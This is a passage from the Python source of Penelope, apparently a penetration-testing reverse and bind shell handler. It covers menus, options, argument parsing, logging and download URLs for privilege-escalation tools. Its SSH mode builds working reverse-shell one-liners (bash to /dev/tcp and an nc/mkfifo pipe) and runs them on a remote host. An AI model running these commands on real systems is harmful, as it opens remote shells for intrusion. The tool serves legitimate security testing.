			logger.error(e.reason)
			if (hasattr(ssl, 'SSLCertVerificationError') and type(e.reason) == ssl.SSLCertVerificationError) or\
				(isinstance(e.reason, ssl.SSLError) and "CERTIFICATE_VERIFY_FAILED" in str(e)):
				answer = ask("Cannot verify SSL Certificate. Download anyway? (y/N): ")
				if answer.lower() == 'y': # Trust the cert
					ctx = ssl._create_unverified_context()
					continue
			else:
				answer = ask("Connection error. Try again? (Y/n): ")
				if answer.lower() == 'n': # Trust the cert
					pass
				else:
					continue
		return None, None

	filename = response.headers.get_filename()
	if filename:
		filename = filename.strip('"')
	elif URL.split('/')[-1]:
		filename = URL.split('/')[-1]
	else:
		filename = URL.split('/')[-2]

	size = int(response.headers.get('Content-Length'))
	data = bytearray()
	pbar = PBar(size, caption=f" {paint('⤷').cyan} ", barlen=40, metric=Size)
	while True:
		try:
			chunk = response.read(options.network_buffer_size)
			if not chunk:
				break
			data.extend(chunk)
			pbar.update(len(chunk))
		except Exception as e:
			logger.error(e)
			pbar.terminate()
			break

	return filename, data

def check_urls():
	global URLS
	urls = URLS.values()
	space_num = len(max(urls, key=len))
	all_ok = True
	for url in urls:
		req = Request(url, method="HEAD", headers={'User-Agent': options.useragent})
		try:
			with urlopen(req, timeout=5) as response:
				status_code = response.getcode()
		except HTTPError as e:
			all_ok = False
			status_code = e.code
		except:
			return None
		if __name__ == '__main__':
			color = 'RED' if status_code >= 400 else 'GREEN'
			print(f"{paint(url).cyan}{paint('.').DIM * (space_num - len(url))} => {getattr(paint(status_code), color)}")
	return all_ok

def listener_menu():
	if not core.listeners:
		return False

	listener_menu.active = True
	func = lambda: _
	listener_menu.control_r, listener_menu.control_w = os.pipe()

	listener_menu.finishing = threading.Event()

	while True:
		tty.setraw(sys.stdin)
		stdout(
			f"\r\x1b[?25l{paint('➤ ').white} "
			f"🏠 {paint('Main Menu').green} (m) "
			f"💀 {paint('Payloads').magenta} (p) "
			f"🔄 {paint('Clear').yellow} (Ctrl-L) "
			f"🚫 {paint('Quit').red} (q/Ctrl-C)\r\n".encode()
		)

		r, _, _ = select([sys.stdin, listener_menu.control_r], [], [])

		if sys.stdin in r:
			command = sys.stdin.read(1).lower()
			if command == 'm':
				func = menu.show
				break
			elif command == 'p':
				termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
				print()
				for listener in core.listeners.values():
					print(listener.payloads, end='\n\n')
			elif command == '\x0C':
				os.system("clear")
			elif command in ('q', '\x03'):
				func = core.stop
				menu.stop = True
				break
			stdout(b"\x1b[1A")
			continue
		break

	termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
	stdout(b"\x1b[?25h\r")
	func()
	os.close(listener_menu.control_r)
	listener_menu.active = False
	listener_menu.finishing.set()
	return True

def play_sound(sound_name: str):
    if options.use_sounds:
        subprocess.run(["paplay"], input=base64.b64decode(SOUNDS[sound_name]))

def load_rc():
	RC = Path(options.basedir / "peneloperc")
	try:
		with open(RC, "r") as rc:
			exec(rc.read(), globals())
	except FileNotFoundError:
		RC.touch()
	os.chmod(RC, 0o600)

def load_modules():
    modules_dir = Path(options.basedir) / "modules"
    modules_dir.mkdir(exist_ok=True)

    if not modules_dir.exists():
        modules_dir.mkdir()

    for module in modules_dir.iterdir():
        if module.is_file() and module.suffix == ".py":
            try:
                with open(module, "r") as module_file:
                    exec(module_file.read(), globals())
            except Exception as e:
                print(f"Error loading module {module}: {e}")

def fonts_installed():

	if myOS == "Darwin":
		return True

	result = subprocess.run(
		["fc-list", ":charset=1f600"],  # 1F600 = smiling face
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE,
		text=True
	)
	return bool(result.stdout.strip())

# OPTIONS
class Options:
	log_levels = {"silent":'WARNING', "debug":'DEBUG'}

	def __init__(self):
		self.basedir = Path.home() / f'.{__program__}'
		self.default_listener_port = 4444
		self.default_bindshell_port = 5555
		self.default_fileserver_port = 8000
		self.default_interface = "0.0.0.0"
		self.payloads = False
		self.use_sounds = False
		self.no_log = False
		self.no_timestamps = False
		self.no_colored_timestamps = False
		self.max_maintain = 10
		self.maintain = 1
		self.single_session = False
		self.no_attach = False
		self.no_upgrade = False
		self.debug = False
		self.dev_mode = False
		self.latency = .01
		self.histlength = 2000
		self.long_timeout = 60
		self.short_timeout = 4
		self.max_open_files = 5
		self.verify_ssl_cert = True
		self.proxy = ''
		self.upload_chunk_size = 51200
		self.download_chunk_size = 1048576
		self.network_buffer_size = 16384
		self.escape = {'sequence':b'\x1b[24~', 'key':'F12'}
		self.logfile = f"{__program__}.log"
		self.debug_logfile = "debug.log"
		self.cmd_histfile = 'cmd_history'
		self.debug_histfile = 'cmd_debug_history'
		self.useragent = "Wget/1.21.2"
		self.attach_lines = 20

	def __getattribute__(self, option):
		if option in ("logfile", "debug_logfile", "cmd_histfile", "debug_histfile"):
			return self.basedir / super().__getattribute__(option)
#		if option == "basedir":
#			return Path(super().__getattribute__(option))
		return super().__getattribute__(option)

	def __setattr__(self, option, value):
		show = logger.error if 'logger' in globals() else lambda x: print(paint(x).red)
		level = __class__.log_levels.get(option)

		if level:
			level = level if value else 'INFO'
			logging.getLogger(__program__).setLevel(getattr(logging, level))

		elif option == 'maintain':
			if value > self.max_maintain:
				show(f"Maintain value decreased to the max ({self.max_maintain})")
				value = self.max_maintain
			if value < 1:
				value = 1
			#if value == 1: show("Maintain value should be 2 or above")
			if value > 1 and self.single_session:
				show("Single Session mode disabled because Maintain is enabled")
				self.single_session = False

		elif option == 'single_session':
			if self.maintain > 1 and value:
				show("Single Session mode disabled because Maintain is enabled")
				value = False

		elif option == 'no_bins':
			if value is None:
				value = []
			elif type(value) is str:
				value = re.split('[^a-zA-Z0-9]+', value)

		elif option == 'proxy':
			if not value:
				os.environ.pop('http_proxy', '')
				os.environ.pop('https_proxy', '')
			else:
				os.environ['http_proxy'] = value
				os.environ['https_proxy'] = value

		elif option == 'basedir':
			value.mkdir(parents=True, exist_ok=True)

		if hasattr(self, option) and getattr(self, option) is not None:
			new_value_type = type(value).__name__
			orig_value_type = type(getattr(self, option)).__name__
			if new_value_type == orig_value_type:
				self.__dict__[option] = value
			else:
				show(f"Wrong value type for '{option}': Expect <{orig_value_type}>, not <{new_value_type}>")
		else:
			self.__dict__[option] = value

def main():

	## Command line options
	parser = ArgumentParser(description="Penelope Shell Handler", add_help=False,
		formatter_class=lambda prog: ArgumentDefaultsHelpFormatter(prog, width=150, max_help_position=40))

	parser.add_argument("-p", "--port", help=f"Port to listen/connect/serve, depending on -i/-c/-s options. \
		Default: {options.default_listener_port}/{options.default_bindshell_port}/{options.default_fileserver_port}")
	parser.add_argument("args", nargs='*', help="Arguments for -s/--serve and SSH reverse shell")

	method = parser.add_argument_group("Reverse or Bind shell?")
	method.add_argument("-i", "--interface", help="Interface or IP address to listen on. Default: 0.0.0.0", metavar='')
	method.add_argument("-c", "--connect", help="Bind shell Host", metavar='')

	hints = parser.add_argument_group("Hints")
	hints.add_argument("-a", "--payloads", help="Show sample payloads for reverse shell based on the registered Listeners", action="store_true")
	hints.add_argument("-l", "--interfaces", help="Show the available network interfaces", action="store_true")
	hints.add_argument("-h", "--help", action="help", help="show this help message and exit")

	log = parser.add_argument_group("Session Logging")
	log.add_argument("-L", "--no-log", help="Do not create session log files", action="store_true")
	log.add_argument("-T", "--no-timestamps", help="Do not include timestamps in session logs", action="store_true")
	log.add_argument("-CT", "--no-colored-timestamps", help="Do not color timestamps in session logs", action="store_true")

	misc = parser.add_argument_group("Misc")
	misc.add_argument("-m", "--maintain", help="Maintain NUM total shells per target", type=int, metavar='')
	misc.add_argument("-M", "--menu", help="Just land to the Main Menu", action="store_true")
	misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
	misc.add_argument("-C", "--no-attach", help="Disable auto attaching sessions upon creation", action="store_true")
	misc.add_argument("-U", "--no-upgrade", help="Do not upgrade shells", action="store_true")
	misc.add_argument("-ss", "--use-sounds", help="Make a sound when a revshell is received")

	misc = parser.add_argument_group("File server")
	misc.add_argument("-s", "--serve", help="HTTP File Server mode", action="store_true")
	misc.add_argument("-prefix", "--url-prefix", help="URL prefix", type=str, metavar='')

	debug = parser.add_argument_group("Debug")
	debug.add_argument("-N", "--no-bins", help="Simulate binary absence on target (comma separated list)", metavar='')
	debug.add_argument("-v", "--version", help="Show Penelope version", action="store_true")
	debug.add_argument("-d", "--debug", help="Show debug messages", action="store_true")
	debug.add_argument("-dd", "--dev-mode", help="Developer mode", action="store_true")
	debug.add_argument("-cu", "--check-urls", help="Check health of hardcoded URLs", action="store_true")

	parser.parse_args(None, options)

	# Modify objects for testing
	if options.dev_mode:
		logger.critical("(!) THIS IS DEVELOPER MODE (!)")
		#stdout_handler.addFilter(lambda record: True if record.levelno != logging.DEBUG else False)
		#logger.setLevel('DEBUG')
		#options.max_maintain = 50
		#options.no_bins = 'python,python3,script'

	sounds_compatible = False
	if options.use_sounds:
		# Check if sounds available
		if platform.system().lower() == "linux" and shutil.which("paplay") is not None:
			# Its linux and there is paplay command
			sounds_compatible = True

		if not sounds_compatible:
			options.use_sounds = False
			print("Can't use sounds, make sure you have pulseaudio-utils installed (just linux for now)")


	global keyboard_interrupt
	signal.signal(signal.SIGINT, lambda num, stack: core.stop())

	# Show Version
	if options.version:
		print(__version__)

	# Show Interfaces
	elif options.interfaces:
		print(Interfaces())

	# Check hardcoded URLs
	elif options.check_urls:
		signal.signal(signal.SIGINT, signal.SIG_DFL)
		check_urls()

	# Main Menu
	elif options.menu:
		signal.signal(signal.SIGINT, keyboard_interrupt)
		menu.show()
		menu.start()

	# File Server
	elif options.serve:
		server = FileServer(*options.args or '.', port=options.port, host=options.interface, url_prefix=options.url_prefix)
		if server.filemap:
			server.start()
		else:
			logger.error("No files to serve")

	# Reverse shell via SSH
	elif options.args and options.args[0] == "ssh":
		if len(options.args) > 1:
			TCPListener(host=options.interface, port=options.port)
			options.args.append(f"HOST=$(echo $SSH_CLIENT | cut -d' ' -f1); PORT={options.port or options.default_listener_port};"
				f"printf \"(bash >& /dev/tcp/$HOST/$PORT 0>&1) &\"|bash ||"
				f"printf \"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc $HOST $PORT >/tmp/_) >/dev/null 2>&1 &\"|sh"
			)
		try:
			if subprocess.run(options.args).returncode == 0:
				logger.info("SSH command executed!")
				menu.start()
			else:
				core.stop()
				sys.exit(1)
		except Exception as e:
			logger.error(e)

	# Bind shell
	elif options.connect:
		if not Connect(options.connect, options.port or options.default_bindshell_port):
			sys.exit(1)
		menu.start()

	# Reverse Listener
	else:
		TCPListener(host=options.interface, port=options.port)
		if not core.listeners:
			sys.exit(1)

		listener_menu()
		signal.signal(signal.SIGINT, keyboard_interrupt)
		menu.start()

#################### PROGRAM LOGIC ####################

# Check Python version
if not sys.version_info >= (3, 6):
	print("(!) Penelope requires Python version 3.6 or higher (!)")
	sys.exit(1)

# Apply default options
options = Options()

# Loggers
## Add TRACE logging level
TRACE_LEVEL_NUM = 25
logging.addLevelName(TRACE_LEVEL_NUM, "TRACE")
logging.TRACE = TRACE_LEVEL_NUM
def trace(self, message, *args, **kwargs):
    if self.isEnabledFor(TRACE_LEVEL_NUM):
        self._log(TRACE_LEVEL_NUM, message, args, **kwargs)
logging.Logger.trace = trace

## Setup Logging Handlers
stdout_handler = logging.StreamHandler()
stdout_handler.setFormatter(CustomFormatter())
stdout_handler.terminator = ''

file_handler = logging.FileHandler(options.logfile)
file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S"))
file_handler.setLevel('INFO') # ??? TODO
file_handler.terminator = ''

debug_file_handler = logging.FileHandler(options.debug_logfile)
debug_file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s"))
debug_file_handler.addFilter(lambda record: True if record.levelno == logging.DEBUG else False)
debug_file_handler.terminator = ''

## Initialize Loggers
logger = logging.getLogger(__program__)
logger.addHandler(stdout_handler)
logger.addHandler(file_handler)
logger.addHandler(debug_file_handler)

cmdlogger = logging.getLogger(f"{__program__}_cmd")
cmdlogger.setLevel(logging.INFO)
cmdlogger.addHandler(stdout_handler)

# Set constants
myOS = platform.system()
TTY_NORMAL = termios.tcgetattr(sys.stdin)
DISPLAY = 'DISPLAY' in os.environ
TERMINALS = [
	'gnome-terminal', 'mate-terminal', 'qterminal', 'terminator', 'alacritty', 'kitty', 'tilix',
	'konsole', 'xfce4-terminal', 'lxterminal', 'urxvt', 'st', 'xterm', 'eterm', 'x-terminal-emulator'
]
TERMINAL = next((term for term in TERMINALS if shutil.which(term)), None)
MAX_CMD_PROMPT_LEN = 335
LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
URLS = {
	'linpeas':      "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
	'winpeas':      "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat",
	'socat':        "https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat",
	'ncat':         "https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/ncat",
	'lse':          "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
	'powerup':      "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1",
	'deepce':       "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh",
	'privesccheck': "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1",
	'les':          "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh",
	'ngrok_linux':  "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
	'uac_linux':  	"https://github.com/tclahr/uac/releases/download/v3.1.0/uac-3.1.0.tar.gz",
	'linux_procmemdump':  	"https://raw.githubusercontent.com/tclahr/uac/refs/heads/main/bin/linux/linux_procmemdump.sh",
}
SOUNDS = {
    'success': """
    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L97glqXMbHNEAqM5eTtNkwPEq90JZVzbzv7DDHpI7FnVD91f+egUAJ65E6f/16q6CIJl8236m//0QTTdU1////6GOAsvYCqVDAIgOB0FefZwm+mBsjTun08toegjslpUttYBwa2W6LBn///xjk7o5q033/4kl/////j0RgApb/+W/rrwQwCGCOiXFTqhkuczkCgY15AgMukIW6JoqY302b6mM6u///uUZBEAA4xe1FOYafRBaXstPaqCjWV9V+2tVQDyHqy89RY4Sj646DUbzcA56H3RGmp4reklPThiIerK58Zj5w+dLpd/nx5l256YMy121p/z0FEFN8v9Xfb/ZTmAJ0gPLdR+j61HSm7f/OgUX8/////15E0gleQCIMASArquedUCxCwH2Q1SCemjze7U1k5w1uOX8EP+S4uDn///wbi8WD0tNmKjGr/xHFP////0OCJ/////KQgAQnBACHnCisNKJOWrh/y6hvckCmQu2reqoyBu4OALOCnEMYJTse/6nJKOkbJpN5i3bLyIHf/aTzIlMLZr4ZURFmQFiSVEw69xYUXC6ffP/BEH////v+GJKNPS31Qm//wXk+/////Q1hkXlmCWWlAcaaRQOrO8ax2AonAes01YrOYvdm676+0ZSeAiGryhWP4+KDX+Y9ev+buuzf//UO/////ONAD+modAZWlVOzXlR4dwS09gp0wCRB31EgOA1iKMgKPSsIIJPYO9//uUZBGAA1hfXvnmVgw9R5sfYTA4DM17Z6w9S9D2nqx80B9ImthO2ucKz+7r3ea7K7ev8QA7ImaX0J/jIHbATgghehIEWHDhEnmjVh0Y/8Xf9v//m0C4GQzR821touGjf/qA6b3t////+I4pjBCYOWELMMgwL9LFXx1MipYqIkIJAlAT9xLWgqHMurOBEInqWipI2G4Xf5w///vo3SRV2b/+MX////7KJ31iJ9o2Z8yzNBFpuYq5xQMo8KJjD2FgGMvDHCVTngKQhmRB0p++vgQa+8w4tzoirAd4or//ro8Hkr9UeSd9/PApYQGOHiiupK0uLLP/xk31NVv/0X8TkC1//cTf/5wYHdpv////4M5Yg6P6gGtALoAkolQkA42NwRkXwvg9CedOiCRHjHDilZGz+C1jy0Ek1plojhl/qrV//igP132///0OBr/kKrCGlkQ1VS0XJUQIHTkhtEAz9YSEAIWiunIuyfSw46TAXcyNE1Nd1+Tty/vnrvCgCjbt//uUZBkAA55fWGtPU/w8p5u/Mad5jp0zT65hp5D2nqpxl8ziY/7eNr969fvPJ///7Fh/TKJRozH8r+ad69lmef8PAS+PBXGJCSodJWORDalRwlvqElhd+36n//2CWW+/////4jiiIQERJYSrlpUADWdCyEgEKjd3IsMZE4elsZw4NpmElLM9l46fOCR/2//lQKbTjmVVs6//EAz/t///lSoADICIxIQjYbfT2QFvszFfQoITLuHMUAcCkYiXKDBSxQf3SFoEIbpIEmZS+38Ug0xXU4/0mjuUQA+i0byaF/JdI4O4wKSSE/l2RS4BnDyL5g5ihvugyk//I37Gb9k+/X9KPiRRR2a31okd//qSCwP7WfYvXi66yyARQAg4IapZVOypgJo2oQxsq5XdN8/HZMsZaMhY/ALYEAdJnRO4mv//f+ZqpVJIKQo//4rBb/////UTv9NVABAYEARlgtoonTZ26StgMCC8E24Vv27qZt3ctyvkkkfzpk2nnePFIBsX//uUZBWABEdL1v1p4AA2xYs9pagADTF3fTjzgAEWLrO3ENAC1W/V6vV7Wr+vn1379/+/eIw0DQNA0DQNAlhpmm/f//+TqxWKxWKxWKxX////v5379+/f///9WKz9WOv//////37948ePHjx4pEMQ9D0Pfv38/eP379+/fv3883//fAUUqUiGUAQD/IgeAAQTyOq/zRjN48HghDGMaBMJ58fly5crUd09kMMMMMb/Kf///yn//U+CAP8iba45cg4AdH1T2CB9EiteD+bBmCJ2jKyI2xB2D8H5wijw3NG4DBICEbCiNRsQEs0XCKLqHdRu44DkTCUIzfmGHn47/0MP+e/mBA3/MMY89zEzf2e/mGOeh57mGTlB4N0Rjjv/9//nf8v8LB+MH7MHgAAAwLhALQvAT+FmGV6qKJ9fWKo9kitkyaaGzE4/0jFNJFm///////+xMV//5LGKKKn6mr///J7bf/////zq3GAAhSAARaqGkdDMhGQ3iXcCSWWuQMwp//uUZAwAAylbXHdlQAA9i1x+5ZwBi2Fte+eotED2rWxQ8bUY1Rp1l3sRqSqIuULdzhmtqLU3HoMgIFM9lPMY7nE85djVZmOY50Ne9Evo9HOLkwigGRZUsXdiI5X/mp//arXBeH385Tf///Rv/R3KPwC8QhBDIiTYgXIecdwCQey3vxBgOjRbNr0N1FosZ/Ws0KkjtL1v40lP////7oIAet/////+aFTv///////hNuUYFcOysO55zNoQ4QJlOgG+Aqk3cAQo84rOiCt25LdV5lmev5cuKy2uRejHt2CDmWpSoxWUOSS3l2eqmRX//6gMx2QTKhSnEVs75v//VpQod/iP///0/+YjCrWQAFADDcyQ3h/hDU3yz9wEjUSRznIaBniNjr/gE4qf/485z/////ghgRdS11qX////8FoI/+V//////yolKtGAI0iQSiko4LCHHfh8UOgy6xCSxFV86wZZMBLWRFDQeSTmEXC+mPzLUtZpxoBl9kNSZV4/otju//uUZBwAAuBZ3GsNU1Y4a1wvJCU2i+1lcew86dDcLW44oB+AfR0Nr//+RIZO0dDTfv7+v+pK5oSwU0/In///851Vn86Ho4Ill2IANEM0FAog0IAAyULh4Y2biskOJOyXQGe4//Gt/10KCuy7////+gSDev/////QBm///////+Kw6AAKhEbBTTLiIyKi6g47WgoMtW6smLDxRYGWOJE9ui7SHxBg9dD1Frouijw2Rn7L/U2CJx+lVqusMT7nWZRw84gl5zov+29SII+lLo+3vp//aoVP/xoW///+//hUd7JmBAFRAABAzQXg13GoU5bzx4WQ90Mol4jmVfr4jgl9FqrI6E3///Hg///////B+Mf//////+pOmFIRVkY0FGUTDhHXCQasDjAEpe3QPU2/VNO8F+V/Ph/I/Rs+C8MKi/+fvFQ0/zxExHBs0DVHF4mHv39pc3DnTX//Ez9nnOcmy3ReZ//ZYPBd/nt///9//ChdCv+igDuyowMIHcUCeC4D//uUZDSAAtlaX/nrPN40a1v/KAXgCzlraeyxqwDWrW68oAsAXUDJ9OQsjseY+1R4yFXtVuVHP/8Y///6wb//////CP/T//////FsggAHQmEAvXleWqOe1ibaoSUSptSW1NnhsK2cXuYQn1y+VlzVTaA/1tdgFYYHqdf6TCMprsp6j5YbsXWVqU9v/5EL+pZrStZ6br3VR//tk5D/R////f/ySaeuGIAdAAAAvO5TyU1JQJhdeeOszrv6ETnK/VuoWfgv9yGl1//66KK7t/////wAf/X/////+g2GQABFNAAJSaUBRxYHEglK1LjMDM0VPFvSxymdk6KYUTj7sslhEDSzQeycKMazzhb9rwmDftdNklo+oWcpXvhmV///0fIbcg0lFbRPf//TYDG/0///+te2uHKCp7IFv6QLEyQEGCIJ4sANcJAmLLeeIg1Vx7elIjl5V+rcwO//xX//9eNH//////4S///////+cO9SAAu5sICT0L0HOUDgCJ7sBcGZ//uUZFMAAvJZ2fswE+Q0a1utHAXgjBFrYe0+LMDOIWy40AuARyiOkwOXUCcrdAiC0Ep3I/AyhVssnic01V5CXvQPLUiEMDtvspTpOtb1inrt1qmN0dCv89/OHS4OUO/WjS3/9f//5R/6m///9f/zGs/EGAAkEAIJiJmal8c6BPBwl/1Eqk6ZpUf3xPSyVvfbjMGr//Ln/t+u9y//////xY3///yap1EHZ0c0Y5I3C4Ka7puw6I6YcFavKJorBCXGYnWiLz1FjUK5FjjICYgJYyBH6vFQV+s8xEPmugDh39gqc5kaye3rRDTzA3OlipqGEras/Wcd//QvOCgG7P+Xb/7fkdqQJ0igG4C46QmDpaBYBH+n/RfoUQ3l9GhQ2V9GvKB3/6wLt/vt///eqf/////8r89//+KQyiBs5sRCc0bbWkUGXW2+KwDw1PTpYOhRHDPD+V5/lTTrxHs6gb3UTw1y3q8XA19vvVgnZ7/C3t2oO3WXFJHWompOMS6mPEFq//uUZG2AAvBH3vsNU8w0aFuNMScoi60Lc+w9qvDOrW50kRTKKaklKTVO/QV1f/8twrizw0t3//Yj2kCVskBSCCPRyY0EASdQeoEqfQNy4eHxrdG4wM//wX/r////R//////5wQNb///////x1agQADQFAACO2hUwNCWAIhugKgpllaECZQUDm6UHkPw4rDYlb0V/yTZu8iU3gjc53Y+MVNbFhNiWYExgUtJsmtddb1tE+O38cCdNJkGQt0f9KOKS3Mfd+9Zv/1b71AWHGkVk7v5wAH0WHAagQeDoHeHPURRnXOH6BmgdLpM33yeqdI3OHuRD3/+F6b/V////4V///+J7AADAwAAmwuWtUURBEAJERUAM+sgEbCRiOfJFENdh5m9pmLOn41NpZZxXGKYjIHGsXrbP3naC1hRYLSKGa3zBbdepSgWTJfmAqZzDkT8xSej1dGx4MUvrL0Y8an/X6rP//1UXUgWtpRoBjoqC2AkCD+k/vAqZa4blwKGQss5w//uUZImAAxhC1Xt0PUAxiFt/NAXyDFzNU621WFDLIW3wkrWe9waB7//44f+n1f//+3/////+fPf///SqhQAANAQAAC4YENvVG3Jty3hsMyGYgICiiINCacAS+GHomU8yzHDTPyYLTdmNv5GwIA04dJ/sW1zCahcknZYFw2LL6R4TS1alsspzMG0Tft5Bf3/V/o9BBjHR52UU7/X///uMP4jpa3AAaFQAAtggKBGDwO8HQCPFkZh1rFpRVnRf3XGbKyznPAVh19ANf8k1bb+/6d1//////xjLAAAaA4TnBpSBFbCHNsA6DTDkLLtkRACklJno87+KA3pK7l/2NpZUlK/MO3BwFTOSjb3frPKfjmeA6LRotZ4ZoovrRoLUA1lavUO71KX+v/diEq6HhWRnUt8m3//wXnRdYp+poYAB8QxADfH4VPkmZCxB7LsqHWgMOiYrzpboZ8/Oln56EQL/qGbf7//7/puv//////JC/6L4gB44MFPW4FqRGGRRXhSs//uUZKICAzBDUvuQFiA1KEr/NArADHULT+40WIDUIax80CsACMoqFgSnBJRJoNLDzHrS5VsTHvi508/kJhtAnitJUaTM7ju4RRRvV16TLDdo/1j+vvXqQlCZVO7iVyDSoOKj9WV9i5i6o23yEfxYF9TihLH15AH5ZzAGZFIgNxqA0zSxOmhfDwS9C9QFPbHRnUyBpmOdH4eB///gSP/m//1f/7f//f///F323U0AEAAVUZ1KTGJtbM6eAxAFADA0QNYQUk2eUZYfPXX3Kks7A4lHBnixMsZpqPeIbODvYqPJZ4dtX//+1J941fH7x4/anBjbmRSOKvngHIXBYhxJY8CseBq///3Sr+XbzO6c/C4LdPSAwMl97p96////+f//8v44qF8btQAI2QBNsANySh26h/7xEZ0ZXt/+j//4tv4GCGAwQx3zn1OgtCaNRyK7eudGOEAH1Axd0oBrbTbUa8nk7easEpaWYpVR0D8FYYEbNAdVVJayfC+FRLdeadgW//uUZLYAAxxCV+tQLNQ1KFufPOo9jykbXzWngBDLHK/2hiACjaSo5KoxFHUgtJdW9Zsajc/GmDhxHgUqQlr+zfpC1S1SbLGXoDEfWBMDlUkj7+0td8ofd+ONMY5AsQir/SmtSy6k+9SULNU+E90fyI6Piwk7J4FiztQG0Jiu898zp4DjTWH2jdO/buQLD0Bx925jv97jNQr8K0sllfudT+fDUMxGWW8tboZJ///////////9///4S9un/7SOxTS+UU0rYZr6piAACMyEmEVEsTUoTUo3W4+FNGxgmhdhhm4/lzuPeU0l1dQTTNESiGjB7wW8nyaLqCzITMNvAKRMIGQt6BfDGAFwGqx8By